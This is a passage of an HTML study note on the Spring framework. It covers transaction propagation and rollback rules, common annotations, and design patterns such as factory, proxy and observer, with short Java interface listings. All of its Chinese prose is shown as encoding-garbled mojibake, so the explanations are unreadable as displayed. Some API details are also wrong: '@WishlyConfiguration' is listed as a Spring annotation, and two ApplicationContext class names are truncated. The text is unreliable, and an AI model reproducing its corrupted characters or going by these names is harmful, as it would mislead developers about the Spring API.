<li><strong>TransactionDefinition.PROPAGATION_REQUIREDï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åŠ å…¥è¯¥äº‹åŠ¡ï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„äº‹åŠ¡ã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_SUPPORTSï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åŠ å…¥è¯¥äº‹åŠ¡ï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™ä»¥éäº‹åŠ¡çš„æ–¹å¼ç»§ç»­è¿è¡Œã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_MANDATORYï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åŠ å…¥è¯¥äº‹åŠ¡ï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚ï¼ˆmandatoryï¼šå¼ºåˆ¶æ€§ï¼‰</li>
</ul>
<p><strong>ä¸æ”¯æŒå½“å‰äº‹åŠ¡çš„æƒ…å†µï¼š</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_REQUIRES_NEWï¼š</strong> åˆ›å»ºä¸€ä¸ªæ–°çš„äº‹åŠ¡ï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™æŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·ã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_NOT_SUPPORTEDï¼š</strong> ä»¥éäº‹åŠ¡æ–¹å¼è¿è¡Œï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™æŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·ã€‚</li>
<li><strong>TransactionDefinition.PROPAGATION_NEVERï¼š</strong> ä»¥éäº‹åŠ¡æ–¹å¼è¿è¡Œï¼Œå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</li>
</ul>
<p><strong>å…¶ä»–æƒ…å†µï¼š</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_NESTEDï¼š</strong> å¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªäº‹åŠ¡ä½œä¸ºå½“å‰äº‹åŠ¡çš„åµŒå¥—äº‹åŠ¡æ¥è¿è¡Œï¼›å¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™è¯¥å–å€¼ç­‰ä»·äºTransactionDefinition.PROPAGATION_REQUIREDã€‚</li>
</ul>
<h3 id="äº‹åŠ¡è¶…æ—¶å±æ€§" tabindex="-1"> äº‹åŠ¡è¶…æ—¶å±æ€§</h3>
<p>æ‰€è°“äº‹åŠ¡è¶…æ—¶ï¼Œå°±æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡æ‰€å…è®¸æ‰§è¡Œçš„æœ€é•¿æ—¶é—´ï¼Œå¦‚æœè¶…è¿‡è¯¥æ—¶é—´é™åˆ¶ä½†äº‹åŠ¡è¿˜æ²¡æœ‰å®Œæˆï¼Œåˆ™è‡ªåŠ¨å›æ»šäº‹åŠ¡ã€‚åœ¨ TransactionDefinition ä¸­ä»¥ int çš„å€¼æ¥è¡¨ç¤ºè¶…æ—¶æ—¶é—´ï¼Œå…¶å•ä½æ˜¯ç§’ã€‚</p>
<h3 id="äº‹åŠ¡åªè¯»å±æ€§" tabindex="-1"> äº‹åŠ¡åªè¯»å±æ€§</h3>
<p>äº‹åŠ¡çš„åªè¯»å±æ€§æ˜¯æŒ‡ï¼Œå¯¹äº‹åŠ¡æ€§èµ„æºè¿›è¡Œåªè¯»æ“ä½œæˆ–è€…æ˜¯è¯»å†™æ“ä½œã€‚æ‰€è°“äº‹åŠ¡æ€§èµ„æºå°±æ˜¯æŒ‡é‚£äº›è¢«äº‹åŠ¡ç®¡ç†çš„èµ„æºï¼Œæ¯”å¦‚æ•°æ®æºã€ JMS èµ„æºï¼Œä»¥åŠè‡ªå®šä¹‰çš„äº‹åŠ¡æ€§èµ„æºç­‰ç­‰ã€‚å¦‚æœç¡®å®šåªå¯¹äº‹åŠ¡æ€§èµ„æºè¿›è¡Œåªè¯»æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†äº‹åŠ¡æ ‡å¿—ä¸ºåªè¯»çš„ï¼Œä»¥æé«˜äº‹åŠ¡å¤„ç†çš„æ€§èƒ½ã€‚</p>
<h3 id="äº‹åŠ¡å›æ»šè§„åˆ™" tabindex="-1"> äº‹åŠ¡å›æ»šè§„åˆ™</h3>
<p>è¿™äº›è§„åˆ™å®šä¹‰äº†å“ªäº›å¼‚å¸¸ä¼šå¯¼è‡´äº‹åŠ¡å›æ»šè€Œå“ªäº›ä¸ä¼šã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œäº‹åŠ¡åªæœ‰é‡åˆ°è¿è¡ŒæœŸå¼‚å¸¸æ—¶æ‰ä¼šå›æ»šï¼Œè€Œåœ¨é‡åˆ°æ£€æŸ¥å‹å¼‚å¸¸æ—¶ä¸ä¼šå›æ»šï¼ˆè¿™ä¸€è¡Œä¸ºä¸EJBçš„å›æ»šè¡Œä¸ºæ˜¯ä¸€è‡´çš„ï¼‰ã€‚ä½†æ˜¯ä½ å¯ä»¥å£°æ˜äº‹åŠ¡åœ¨é‡åˆ°ç‰¹å®šçš„æ£€æŸ¥å‹å¼‚å¸¸æ—¶åƒé‡åˆ°è¿è¡ŒæœŸå¼‚å¸¸é‚£æ ·å›æ»šã€‚åŒæ ·ï¼Œä½ è¿˜å¯ä»¥å£°æ˜äº‹åŠ¡é‡åˆ°ç‰¹å®šçš„å¼‚å¸¸ä¸å›æ»šï¼Œå³ä½¿è¿™äº›å¼‚å¸¸æ˜¯è¿è¡ŒæœŸå¼‚å¸¸ã€‚</p>
<p>æ³¨è§£ <strong>@Transactional(rollbackFor = Exception.class)</strong></p>
<p>Exceptionåˆ†ä¸ºè¿è¡Œæ—¶å¼‚å¸¸RuntimeExceptionå’Œéè¿è¡Œæ—¶å¼‚å¸¸ã€‚äº‹åŠ¡ç®¡ç†å¯¹äºä¼ä¸šåº”ç”¨æ¥è¯´æ˜¯è‡³å…³é‡è¦çš„ï¼Œå³ä½¿å‡ºç°å¼‚å¸¸æƒ…å†µï¼Œå®ƒä¹Ÿå¯ä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚</p>
<p>å½“<code>@Transactional</code>æ³¨è§£ä½œç”¨äºç±»ä¸Šæ—¶ï¼Œè¯¥ç±»çš„æ‰€æœ‰ public æ–¹æ³•å°†éƒ½å…·æœ‰è¯¥ç±»å‹çš„äº‹åŠ¡å±æ€§ï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ–¹æ³•çº§åˆ«ä½¿ç”¨è¯¥æ ‡æ³¨æ¥è¦†ç›–ç±»çº§åˆ«çš„å®šä¹‰ã€‚å¦‚æœç±»æˆ–è€…æ–¹æ³•åŠ äº†è¿™ä¸ªæ³¨è§£ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»é‡Œé¢çš„æ–¹æ³•æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¼šå›æ»šï¼Œæ•°æ®åº“é‡Œé¢çš„æ•°æ®ä¹Ÿä¼šå›æ»šã€‚</p>
<p>åœ¨<code>@Transactional</code>æ³¨è§£ä¸­å¦‚æœä¸é…ç½®<code>rollbackFor</code>å±æ€§,é‚£ä¹ˆäº‹ç‰©åªä¼šåœ¨é‡åˆ°<code>RuntimeException</code>çš„æ—¶å€™æ‰ä¼šå›æ»š,åŠ ä¸Š<code>rollbackFor=Exception.class</code>,å¯ä»¥è®©äº‹ç‰©åœ¨é‡åˆ°éè¿è¡Œæ—¶å¼‚å¸¸æ—¶ä¹Ÿå›æ»šã€‚</p>
<h1 id="spring-æ³¨è§£" tabindex="-1"> Spring æ³¨è§£</h1>
<h2 id="å£°æ˜bean" tabindex="-1"> å£°æ˜Bean</h2>
<p>@<strong>Component</strong></p>
<p>å¯ä»¥ä½¿ç”¨æ­¤æ³¨è§£æè¿°Springä¸­çš„Beanï¼Œä½†å®ƒåªæ˜¯ä¸€ä¸ªæ³›åŒ–çš„æ¦‚å¿µï¼Œä»…ä»…è¡¨ç°ä¸€ä¸ªç»„ä»¶ï¼ˆBeanï¼‰ï¼Œå¹¶ä¸”å¯ä»¥ä½œç”¨åœ¨ä»»ä½•å±‚æ¬¡ã€‚</p>
<p>@<strong>Repository</strong></p>
<p>ç”¨äºå°†æ•°æ®è®¿é—®å±‚(DAOå±‚)çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Componentç›¸åŒã€‚</p>
<p>@<strong>Service</strong></p>
<p>é€šå¸¸ä½œç”¨åœ¨ä¸šåŠ¡å±‚(Serviceå±‚)ç”¨äºå°†ä¸šåŠ¡å±‚çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Componentç›¸åŒã€‚</p>
<p>@<strong>Controller</strong></p>
<p>é€šå¸¸ä½œç”¨åœ¨æ§åˆ¶å±‚(å¦‚SpringMVCçš„Controler)ç”¨äºå°†æ§åˆ¶å±‚çš„ç±»è¡¨ç¤ºä¸ºä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Componentç›¸åŒã€‚</p>
<h2 id="æ³¨å…¥bean" tabindex="-1"> æ³¨å…¥Bean</h2>
<p>@<strong>Autowired</strong></p>
<p>ç”¨äºå¯¹Beançš„å±æ€§å˜é‡ã€å±æ€§çš„setteræ–¹æ³•åŠæ„é€ æ–¹æ³•è¿›è¡Œæ ‡æ³¨ï¼Œé…åˆç›¸åº”çš„æ³¨è§£å¤„ç†å™¨å®ŒæˆBeançš„è‡ªåŠ¨é…ç½®å·¥ä½œã€‚é»˜è®¤æŒ‰ç…§Beançš„ç±»å‹(byType)è¿›è¡Œè£…é…ã€‚</p>
<p>@<strong>Resource</strong></p>
<p>å…¶ä½œç”¨ä¸@Autowiredä¸€æ ·ã€‚ å…¶åŒºåˆ«åœ¨äº@Autowiredé»˜è®¤æŒ‰ç…§Beanç±»å‹è£…é…ï¼Œè€Œ@Resourceé»˜è®¤æŒ‰ç…§Beanå®ä¾‹åç§°è¿›è¡Œè£…é…ã€‚@Resourceä¸­æœ‰ä¸¤ä¸ªå®ä¾‹ç±»å‹ã€‚nameå’Œtypeã€‚Spring å°†nameå±æ€§è§£æä¸ºBeanå®ä¾‹åç§°(id)ï¼Œtype å±æ€§è§£æä¸ºBeanå®ä¾‹ç±»å‹ï¼Œå¦‚æœæŒ‡å®šnameå±æ€§ï¼Œåˆ™æ¥å®ä¾‹åç§°è¿›è¡Œè£…é…ï¼›å¦‚æœæŒ‡å®štypeå±æ€§ï¼Œåˆ™æŒ‰Beanç±»å‹è¿›è¡Œè£…é…ï¼›å¦‚æœéƒ½ä¸æŒ‡å®šï¼Œåˆ™å…ˆæŒ‰Beanå®ä¾‹åç§°è£…é…ï¼Œå¦‚æœä¸èƒ½åŒ¹é…ï¼Œå†æŒ‰ç…§Beanç±»å‹è¿›è¡Œè£…é…:å¦‚æ— æ³•åŒ¹é…ï¼Œåˆ™æŠ›å‡ºNoSuchBeanDefinitionExceptionå¼‚å¸¸ã€‚</p>
<h2 id="é…ç½®ç±»ç›¸å…³æ³¨è§£" tabindex="-1"> é…ç½®ç±»ç›¸å…³æ³¨è§£</h2>
<p>@<strong>Configuration</strong></p>
<p>å£°æ˜å½“å‰ç±»ä¸ºé…ç½®ç±»ï¼Œå…¶ä¸­å†…éƒ¨ç»„åˆäº†@Componentæ³¨è§£ï¼Œè¡¨æ˜è¿™ä¸ªç±»æ˜¯ä¸€ä¸ªbeanï¼Œç›¸å½“äºxmlå½¢å¼çš„Springé…ç½®ï¼›</p>
<p>ä½¿ç”¨@Configurationï¼Œæ‰€æœ‰æ ‡è®°ä¸º@Beançš„æ–¹æ³•å°†è¢«åŒ…è£…æˆä¸€ä¸ªCGLIBåŒ…è£…å™¨ï¼Œå®ƒçš„å·¥ä½œæ–¹å¼å°±å¥½åƒæ˜¯è¿™ä¸ªæ–¹æ³•çš„ç¬¬ä¸€ä¸ªè°ƒç”¨ï¼Œé‚£ä¹ˆåŸå§‹æ–¹æ³•çš„ä¸»ä½“å°†è¢«æ‰§è¡Œï¼Œæœ€ç»ˆçš„å¯¹è±¡å°†åœ¨springä¸Šä¸‹æ–‡ä¸­æ³¨å†Œã€‚æ‰€æœ‰è¿›ä¸€æ­¥çš„è°ƒç”¨åªè¿”å›ä»ä¸Šä¸‹æ–‡æ£€ç´¢çš„beanã€‚</p>
<p>@<strong>Bean</strong></p>
<p>æ³¨è§£åœ¨æ–¹æ³•ä¸Šï¼Œå£°æ˜å½“å‰æ–¹æ³•çš„è¿”å›å€¼ä¸ºä¸€ä¸ªbean</p>
<p>@<strong>ComponentScan</strong></p>
<p>ç”¨äºå¯¹Componentè¿›è¡Œæ‰«æ</p>
<p>@<strong>WishlyConfiguration</strong></p>
<p>ä¸º@Configurationä¸@ComponentScançš„ç»„åˆæ³¨è§£ï¼Œå¯ä»¥æ›¿ä»£è¿™ä¸¤ä¸ªæ³¨è§£</p>
<p>@<strong>ImportResource</strong></p>
<p>å¯¼â¼ŠXMLä¸­çš„beançš„å…ƒæ•°æ®</p>
<h2 id="åˆ‡é¢-aop-ç›¸å…³æ³¨è§£" tabindex="-1"> åˆ‡é¢(AOP)ç›¸å…³æ³¨è§£</h2>
<p>Springæ”¯æŒAspectJçš„æ³¨è§£å¼åˆ‡é¢ç¼–ç¨‹ã€‚</p>
<p>åœ¨javaé…ç½®ç±»ä¸­ä½¿ç”¨@EnableAspectJAutoProxyæ³¨è§£å¼€å¯Springå¯¹AspectJä»£ç†çš„æ”¯æŒ</p>
<p>@<strong>Aspect</strong></p>
<p>å£°æ˜ä¸€ä¸ªåˆ‡é¢</p>
<p>@<strong>PointCut</strong></p>
<p>å£°æ˜åˆ‡ç‚¹</p>
<p>@<strong>Before</strong></p>
<p>åœ¨æ–¹æ³•æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼ˆæ–¹æ³•ä¸Šï¼‰</p>
<p>@<strong>After</strong></p>
<p>åœ¨æ–¹æ³•æ‰§è¡Œä¹‹åæ‰§è¡Œï¼ˆæ–¹æ³•ä¸Šï¼‰</p>
<p>@<strong>AfterReturning</strong></p>
<p>åç½®é€šçŸ¥,å¿…é¡»åˆ‡ç‚¹æ­£ç¡®æ‰§è¡Œ</p>
<p>@<strong>AfterThrowing</strong></p>
<p>å¼‚å¸¸é€šçŸ¥</p>
<p>@<strong>Around</strong></p>
<p>ç¯ç»•é€šçŸ¥</p>
<h2 id="å±æ€§æ³¨å…¥" tabindex="-1"> å±æ€§æ³¨å…¥</h2>
<p>@<strong>Value</strong></p>
<ul>
<li>æ³¨å…¥æ™®é€šå­—ç¬¦</li>
<li>æ³¨å…¥æ“ä½œç³»ç»Ÿå±æ€§</li>
<li>æ³¨å…¥è¡¨è¾¾å¼ç»“æœ</li>
<li>æ³¨å…¥å…¶å®ƒbeanå±æ€§</li>
<li>æ³¨å…¥æ–‡ä»¶èµ„æº</li>
<li>æ³¨å…¥ç½‘ç«™èµ„æº</li>
<li>æ³¨å…¥é…ç½®æ–‡ä»¶</li>
</ul>
<h2 id="äº‹åŠ¡ç›¸å…³æ³¨è§£" tabindex="-1"> äº‹åŠ¡ç›¸å…³æ³¨è§£</h2>
<p>@<strong>Transactional</strong></p>
<h1 id="spring-ä¸­çš„è®¾è®¡æ¨¡å¼" tabindex="-1"> Spring ä¸­çš„è®¾è®¡æ¨¡å¼</h1>
<h2 id="å·¥å‚æ¨¡å¼" tabindex="-1"> å·¥å‚æ¨¡å¼</h2>
<p>Spring ä½¿ç”¨å·¥å‚æ¨¡å¼å¯ä»¥é€šè¿‡ BeanFactory æˆ– ApplicationContext åˆ›å»º bean å¯¹è±¡ã€‚</p>
<p><strong>ä¸¤è€…å¯¹æ¯”ï¼š</strong></p>
<ul>
<li><code>BeanFactory</code> ï¼šå»¶è¿Ÿæ³¨å…¥(ä½¿ç”¨åˆ°æŸä¸ª bean çš„æ—¶å€™æ‰ä¼šæ³¨å…¥),ç›¸æ¯”äº<code>ApplicationContext</code> æ¥è¯´ä¼šå ç”¨æ›´å°‘çš„å†…å­˜ï¼Œç¨‹åºå¯åŠ¨é€Ÿåº¦æ›´å¿«ã€‚</li>
<li><code>ApplicationContext</code> ï¼šå®¹å™¨å¯åŠ¨çš„æ—¶å€™ï¼Œä¸ç®¡ä½ ç”¨æ²¡ç”¨åˆ°ï¼Œä¸€æ¬¡æ€§åˆ›å»ºæ‰€æœ‰ bean ã€‚<code>BeanFactory</code> ä»…æä¾›äº†æœ€åŸºæœ¬çš„ä¾èµ–æ³¨å…¥æ”¯æŒï¼Œ<code> ApplicationContext</code> æ‰©å±•äº† <code>BeanFactory</code> ,é™¤äº†æœ‰<code>BeanFactory</code>çš„åŠŸèƒ½è¿˜æœ‰é¢å¤–æ›´å¤šåŠŸèƒ½ï¼Œæ‰€ä»¥ä¸€èˆ¬å¼€å‘äººå‘˜ä½¿ç”¨<code> ApplicationContext</code>ä¼šæ›´å¤šã€‚</li>
</ul>
<p>ApplicationContextçš„ä¸‰ä¸ªå®ç°ç±»ï¼š</p>
<ol>
<li><code>ClassPathXmlApplication</code>ï¼šæŠŠä¸Šä¸‹æ–‡æ–‡ä»¶å½“æˆç±»è·¯å¾„èµ„æºã€‚</li>
<li><code>FileSystemXmlApplication</code>ï¼šä»æ–‡ä»¶ç³»ç»Ÿä¸­çš„ XML æ–‡ä»¶è½½å…¥ä¸Šä¸‹æ–‡å®šä¹‰ä¿¡æ¯ã€‚</li>
<li><code>XmlWebApplicationContext</code>ï¼šä»Webç³»ç»Ÿä¸­çš„XMLæ–‡ä»¶è½½å…¥ä¸Šä¸‹æ–‡å®šä¹‰ä¿¡æ¯ã€‚</li>
</ol>
<h2 id="å•ä¾‹æ¨¡å¼" tabindex="-1"> å•ä¾‹æ¨¡å¼</h2>
<p>åœ¨æˆ‘ä»¬çš„ç³»ç»Ÿä¸­ï¼Œæœ‰ä¸€äº›å¯¹è±¡å…¶å®æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªï¼Œæ¯”å¦‚è¯´ï¼šçº¿ç¨‹æ± ã€ç¼“å­˜ã€å¯¹è¯æ¡†ã€æ³¨å†Œè¡¨ã€æ—¥å¿—å¯¹è±¡ã€å……å½“æ‰“å°æœºã€æ˜¾å¡ç­‰è®¾å¤‡é©±åŠ¨ç¨‹åºçš„å¯¹è±¡ã€‚äº‹å®ä¸Šï¼Œè¿™ä¸€ç±»å¯¹è±¡åªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¦‚æœåˆ¶é€ å‡ºå¤šä¸ªå®ä¾‹å°±å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜çš„äº§ç”Ÿï¼Œæ¯”å¦‚ï¼šç¨‹åºçš„è¡Œä¸ºå¼‚å¸¸ã€èµ„æºä½¿ç”¨è¿‡é‡ã€æˆ–è€…ä¸ä¸€è‡´æ€§çš„ç»“æœã€‚</p>
<p><strong>Spring ä¸­ bean çš„é»˜è®¤ä½œç”¨åŸŸå°±æ˜¯ singleton(å•ä¾‹)çš„ã€‚</strong> é™¤äº† singleton ä½œç”¨åŸŸï¼ŒSpring ä¸­ bean è¿˜æœ‰ä¸‹é¢å‡ ç§ä½œç”¨åŸŸï¼šprototype ï¼Œ request ï¼Œ  session ï¼Œ global-session</p>
<h2 id="ä»£ç†æ¨¡å¼" tabindex="-1"> ä»£ç†æ¨¡å¼</h2>
<h3 id="ä»£ç†æ¨¡å¼åœ¨aopä¸­çš„åº”ç”¨" tabindex="-1"> ä»£ç†æ¨¡å¼åœ¨AOPä¸­çš„åº”ç”¨</h3>
<p><strong>Spring AOP å°±æ˜¯åŸºäºåŠ¨æ€ä»£ç†çš„</strong>ï¼Œå¦‚æœè¦ä»£ç†çš„å¯¹è±¡ï¼Œå®ç°äº†æŸä¸ªæ¥å£ï¼Œé‚£ä¹ˆSpring AOPä¼šä½¿ç”¨<strong>JDK Proxy</strong>ï¼Œå»åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œè€Œå¯¹äºæ²¡æœ‰å®ç°æ¥å£çš„å¯¹è±¡ï¼Œå°±æ— æ³•ä½¿ç”¨ JDK Proxy å»è¿›è¡Œä»£ç†äº†ï¼Œè¿™æ—¶å€™Spring AOPä¼šä½¿ç”¨<strong>Cglib</strong> ï¼Œè¿™æ—¶å€™Spring AOPä¼šä½¿ç”¨ <strong>Cglib</strong> ç”Ÿæˆä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡çš„å­ç±»æ¥ä½œä¸ºä»£ç†ã€‚</p>
<h2 id="æ¨¡æ¿æ–¹æ³•" tabindex="-1"> æ¨¡æ¿æ–¹æ³•</h2>
<p>æ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯ä¸€ç§è¡Œä¸ºè®¾è®¡æ¨¡å¼ï¼Œå®ƒå®šä¹‰ä¸€ä¸ªæ“ä½œä¸­çš„ç®—æ³•çš„éª¨æ¶ï¼Œè€Œå°†ä¸€äº›æ­¥éª¤å»¶è¿Ÿåˆ°å­ç±»ä¸­ã€‚ æ¨¡æ¿æ–¹æ³•ä½¿å¾—å­ç±»å¯ä»¥ä¸æ”¹å˜ä¸€ä¸ªç®—æ³•çš„ç»“æ„å³å¯é‡å®šä¹‰è¯¥ç®—æ³•çš„æŸäº›ç‰¹å®šæ­¥éª¤çš„å®ç°æ–¹å¼ã€‚</p>
<p>Spring ä¸­ <code>jdbcTemplate</code>ã€<code>hibernateTemplate</code> ç­‰ä»¥ Template ç»“å°¾çš„å¯¹æ•°æ®åº“æ“ä½œçš„ç±»ï¼Œå®ƒä»¬å°±ä½¿ç”¨åˆ°äº†æ¨¡æ¿æ¨¡å¼ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½æ˜¯ä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼æ¥å®ç°æ¨¡æ¿æ¨¡å¼ï¼Œä½†æ˜¯ Spring å¹¶æ²¡æœ‰ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œè€Œæ˜¯ä½¿ç”¨Callback æ¨¡å¼ä¸æ¨¡æ¿æ–¹æ³•æ¨¡å¼é…åˆï¼Œæ—¢è¾¾åˆ°äº†ä»£ç å¤ç”¨çš„æ•ˆæœï¼ŒåŒæ—¶å¢åŠ äº†çµæ´»æ€§ã€‚</p>
<h2 id="è§‚å¯Ÿè€…æ¨¡å¼" tabindex="-1"> è§‚å¯Ÿè€…æ¨¡å¼</h2>
<p>è§‚å¯Ÿè€…æ¨¡å¼æ˜¯ä¸€ç§å¯¹è±¡è¡Œä¸ºå‹æ¨¡å¼ã€‚å®ƒè¡¨ç¤ºçš„æ˜¯ä¸€ç§å¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´å…·æœ‰ä¾èµ–å…³ç³»ï¼Œå½“ä¸€ä¸ªå¯¹è±¡å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œè¿™ä¸ªå¯¹è±¡æ‰€ä¾èµ–çš„å¯¹è±¡ä¹Ÿä¼šåšå‡ºååº”ã€‚Spring äº‹ä»¶é©±åŠ¨æ¨¡å‹å°±æ˜¯è§‚å¯Ÿè€…æ¨¡å¼å¾ˆç»å…¸çš„ä¸€ä¸ªåº”ç”¨ã€‚Spring äº‹ä»¶é©±åŠ¨æ¨¡å‹éå¸¸æœ‰ç”¨ï¼Œåœ¨å¾ˆå¤šåœºæ™¯éƒ½å¯ä»¥è§£è€¦æˆ‘ä»¬çš„ä»£ç ã€‚æ¯”å¦‚æˆ‘ä»¬æ¯æ¬¡æ·»åŠ å•†å“çš„æ—¶å€™éƒ½éœ€è¦é‡æ–°æ›´æ–°å•†å“ç´¢å¼•ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨è§‚å¯Ÿè€…æ¨¡å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<h3 id="spring-äº‹ä»¶é©±åŠ¨æ¨¡å‹ä¸­çš„ä¸‰ç§è§’è‰²" tabindex="-1"> Spring äº‹ä»¶é©±åŠ¨æ¨¡å‹ä¸­çš„ä¸‰ç§è§’è‰²</h3>
<h4 id="äº‹ä»¶è§’è‰²" tabindex="-1"> äº‹ä»¶è§’è‰²</h4>
<p><code>ApplicationEvent</code> (<code>org.springframework.context</code>åŒ…ä¸‹)å……å½“äº‹ä»¶çš„è§’è‰²,è¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒç»§æ‰¿äº†<code>java.util.EventObject</code>å¹¶å®ç°äº† <code>java.io.Serializable</code>æ¥å£ã€‚</p>
<p>Spring ä¸­é»˜è®¤å­˜åœ¨ä»¥ä¸‹äº‹ä»¶ï¼Œä»–ä»¬éƒ½æ˜¯å¯¹ <code>ApplicationContextEvent</code> çš„å®ç°(ç»§æ‰¿è‡ª<code>ApplicationContextEvent</code>)ï¼š</p>
<ul>
<li><code>ContextStartedEvent</code>ï¼š<code>ApplicationContext</code> å¯åŠ¨åè§¦å‘çš„äº‹ä»¶;</li>
<li><code>ContextStoppedEvent</code>ï¼š<code>ApplicationContext</code> åœæ­¢åè§¦å‘çš„äº‹ä»¶;</li>
<li><code>ContextRefreshedEvent</code>ï¼š<code>ApplicationContext</code> åˆå§‹åŒ–æˆ–åˆ·æ–°å®Œæˆåè§¦å‘çš„äº‹ä»¶;</li>
<li><code>ContextClosedEvent</code>ï¼š<code>ApplicationContext</code> å…³é—­åè§¦å‘çš„äº‹ä»¶ã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/framework/spring/ApplicationEvent-Subclass.png" alt="ApplicationEvent-Subclass" loading="lazy"></p>
<h4 id="äº‹ä»¶ç›‘å¬è€…è§’è‰²" tabindex="-1"> äº‹ä»¶ç›‘å¬è€…è§’è‰²</h4>
<p><code>ApplicationListener</code> å……å½“äº†äº‹ä»¶ç›‘å¬è€…è§’è‰²ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ï¼Œé‡Œé¢åªå®šä¹‰äº†ä¸€ä¸ª <code>onApplicationEventï¼ˆï¼‰</code>æ–¹æ³•æ¥å¤„ç†<code>ApplicationEvent</code>ã€‚<code>ApplicationListener</code>æ¥å£ç±»æºç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹å‡ºæ¥å£å®šä¹‰çœ‹å‡ºæ¥å£ä¸­çš„äº‹ä»¶åªè¦å®ç°äº† <code>ApplicationEvent</code>å°±å¯ä»¥äº†ã€‚æ‰€ä»¥ï¼Œåœ¨ Springä¸­æˆ‘ä»¬åªè¦å®ç° <code>ApplicationListener</code> æ¥å£å®ç° <code>onApplicationEvent()</code> æ–¹æ³•å³å¯å®Œæˆç›‘å¬äº‹ä»¶</p>
<div><pre><code><span>package</span> <span>org<span>.</span>springframework<span>.</span>context</span><span>;</span>
<span>import</span> <span><span>java<span>.</span>util<span>.</span></span><span>EventListener</span></span><span>;</span>
<span>@FunctionalInterface</span>
<span>public</span> <span>interface</span> <span>ApplicationListener</span><span><span>&lt;</span><span>E</span> <span>extends</span> <span>ApplicationEvent</span><span>></span></span> <span>extends</span> <span>EventListener</span> <span>{</span>
    <span>void</span> <span>onApplicationEvent</span><span>(</span><span>E</span> var1<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><h4 id="äº‹ä»¶å‘å¸ƒè€…è§’è‰²" tabindex="-1"> äº‹ä»¶å‘å¸ƒè€…è§’è‰²</h4>
<p><code>ApplicationEventPublisher</code> å……å½“äº†äº‹ä»¶çš„å‘å¸ƒè€…ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªæ¥å£ã€‚</p>
<div><pre><code><span>@FunctionalInterface</span>
<span>public</span> <span>interface</span> <span>ApplicationEventPublisher</span> <span>{</span>
    <span>default</span> <span>void</span> <span>publishEvent</span><span>(</span><span>ApplicationEvent</span> event<span>)</span> <span>{</span>
        <span>this</span><span>.</span><span>publishEvent</span><span>(</span><span>(</span><span>Object</span><span>)</span>event<span>)</span><span>;</span>
    <span>}</span>

    <span>void</span> <span>publishEvent</span><span>(</span><span>Object</span> var1<span>)</span><span>;</span>
<span>}</span>

</code></pre></div><p><code>ApplicationEventPublisher</code> æ¥å£çš„<code>publishEventï¼ˆï¼‰</code>è¿™ä¸ªæ–¹æ³•åœ¨<code>AbstractApplicationContext</code>ç±»ä¸­è¢«å®ç°ï¼Œé˜…è¯»è¿™ä¸ªæ–¹æ³•çš„å®ç°ï¼Œä½ ä¼šå‘ç°å®é™…ä¸Šäº‹ä»¶çœŸæ­£æ˜¯é€šè¿‡<code>ApplicationEventMulticaster</code>æ¥å¹¿æ’­å‡ºå»çš„ã€‚</p>
<h3 id="spring-çš„äº‹ä»¶æµç¨‹æ€»ç»“" tabindex="-1"> Spring çš„äº‹ä»¶æµç¨‹æ€»ç»“</h3>
<ol>
